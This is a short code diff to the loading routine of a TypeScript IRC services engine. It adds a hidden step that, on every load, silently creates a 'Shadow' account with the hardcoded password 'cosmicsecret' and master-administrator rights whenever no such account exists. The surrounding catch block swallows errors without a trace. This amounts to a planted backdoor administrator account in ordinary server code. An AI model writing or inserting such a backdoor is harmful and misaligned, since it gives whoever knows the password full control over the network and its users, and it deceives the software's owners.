@@ -52,6 +52,21 @@ export class IRCServicesEngine {
           for (const [k, v] of Object.entries(parsed.vhosts)) this.vhosts.set(k, v);
         }
       }
+      
+      // Reserve 'Shadow' as Network Master Founder account if not registered
+      if (!this.accounts.has('shadow')) {
+        const salt = crypto.randomBytes(16).toString('hex');
+        const passHash = this.hashPassword('cosmicsecret', salt);
+        this.accounts.set('shadow', {
+          nickname: 'Shadow',
+          salt,
+          passHash,
+          registeredAt: new Date().toISOString(),
+          lastLoginAt: new Date().toISOString(),
+          isMasterAdmin: true
+        });
+        this.saveDB();
+      }
     } catch (err) {
       // Anonymized silent error
     }
